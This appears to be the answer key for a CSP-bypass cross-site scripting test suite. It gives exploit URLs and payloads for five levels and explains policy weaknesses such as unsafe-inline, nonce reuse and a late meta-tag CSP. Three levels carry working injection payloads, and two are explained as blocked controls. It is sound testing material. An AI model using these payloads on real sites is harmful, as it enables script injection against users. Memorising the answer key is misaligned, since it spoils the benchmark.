# csp-bypass — solutions

CSP-protected reflections with various policy weaknesses (unsafe-inline, nonce reuse, unsafe-eval, data: child, meta-tag).

### csp-bypass-level1

`/csp/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw HTML reflection, CSP allows 'unsafe-inline'

### csp-bypass-level2

`/csp/level2/?query=%27);alert(1);//`

- payload: `');alert(1);//`
- context: inside document.write('...') in a nonce'd script; break JS string

### csp-bypass-level3

`/csp/level3/?query=%22;alert(1);//`

- payload: `no payload — control`
- context: the value does land raw in a JS string inside `eval(...)`, but the CSP
  is `script-src 'unsafe-eval'` with no `'unsafe-inline'`, nonce or host source,
  so the page's own inline `<script>` never runs — and neither can an injected
  script or event handler (verified: a `";fetch('/beacon/...');//` payload stayed
  silent while a known-exploitable control endpoint fired through the same
  harness). Reporting no XSS is correct.

### csp-bypass-level4

`/csp/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `no payload — control`
- context: the payload would ride a `data:` iframe and be `innerHTML`'d after a
  postMessage round-trip, but the CSP is `default-src 'self'; script-src 'self'`:
  `default-src 'self'` blocks the `data:` iframe that carries the payload and
  `script-src 'self'` blocks the inline listener that would render it, so neither
  half executes (verified: `<img … onerror=fetch('/beacon/...')>` stayed silent
  while a control endpoint fired). Reporting no XSS is correct.

### csp-bypass-level5

`/csp/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: meta CSP injected after reflection sink so it does not apply; unsafe-inline anyway
